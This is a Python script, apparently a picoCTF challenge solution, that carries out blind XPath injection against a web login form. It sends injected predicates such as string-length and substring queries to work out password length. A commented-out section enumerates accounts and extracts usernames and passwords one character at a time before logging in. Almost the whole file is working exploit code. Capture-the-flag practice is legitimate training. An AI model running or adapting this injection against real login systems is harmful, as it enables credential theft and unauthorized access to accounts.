#! /usr/bin/python3.3
import string
import sys
import argparse
from collections import OrderedDict
import re
import requests
from tqdm import tqdm

url = "http://mercury.picoctf.net:59946/"

def is_valid(user, password):
    payload = {'name': user, 'pass': password}
    r = requests.post(url, data=payload)
    if '500 Internal Server Error' in r.text:
        print('ERROR')
        sys.exit(0)
    return 'alert alert-danger' not in r.text


def main():
    for i in tqdm(range(10, 70)):
    # for i in tqdm(string.printable):  
        if is_valid("admin", f"' or string-length(../account[position()=1]/password)='{i}"):
            print("FOUND LENGTH =", i)
    # accountCount = 0

    # for c in range(20):
    #     password = "' or count(../account)='%d' and ''='" % c
    #     response = send_request('admin', password)
    #     if "alert alert-danger" not in response:
    #         accountCount = c
    #         break

    # print("%d Accounts found" % accountCount)

    # for account in range(1, accountCount + 1):
    #     print("Account %d" % account)

    #     loginData = OrderedDict([('username', ''), ('password', '')])
    #     for fieldname in loginData:
    #         length = 0
    #         for i in range(50):
    #             #password = "' or string-length(../child::node()[position()=1]/child::*[position()=3])='%d" % i
    #             #password = "' or string-length(../account[position()=%d]/child::*[position()=%d])='%d" % (account, userpass, i)
    #             password = "' or string-length(../account[position()=%d]/%s)='%d" % (account, fieldname, i)
    #             response = send_request('admin', password)
    #             if "alert alert-danger" not in response:
    #                 length = i
    #                 break

    #         output = ''
    #         for offset in range(length):
    #             print(' ', end="")
    #             for c in string.printable:
    #                 print("\b" + c, end="", flush=True)
    #                 #password = "' or substring(name(parent::*[position()=1]),%s,1)='%s" % (offset+1, c)
    #                 #password = "' or substring(./child::*[position()=3],%s,1)='%s" % (offset+1, c)
    #                 password = "' or substring(../account[position()=%d]/%s,%s,1)='%s" % (account, fieldname, offset + 1, c)
    #                 response = send_request('admin', password)
    #                 if "alert alert-danger" not in response:
    #                     output += c
    #                     break

    #         print('')
    #         loginData[fieldname] = output

    #     response = send_request(loginData['username'], loginData['password'])
    #     print(response)


if __name__ == "__main__":
    main()